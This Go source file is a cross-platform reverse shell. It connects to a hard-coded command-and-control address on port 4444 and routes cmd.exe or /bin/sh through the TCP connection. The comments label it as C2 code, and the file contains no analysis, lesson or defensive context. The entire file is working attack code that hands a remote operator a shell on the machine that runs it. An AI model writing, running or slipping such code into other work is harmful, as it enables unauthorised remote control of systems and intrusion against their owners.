package main

import (
	"net"
	"os"
	"os/exec"
	"runtime"
)

func main() {
	// C2 server address
	c2 := "192.168.1.100:4444"

	// Connect to C2
	conn, err := net.Dial("tcp", c2)
	if err != nil {
		os.Exit(0)
	}
	defer conn.Close()

	// Determine shell based on OS
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd.exe")
	} else {
		cmd = exec.Command("/bin/sh")
	}

	// Pipe I/O through connection
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn

	// Execute
	cmd.Run()
}
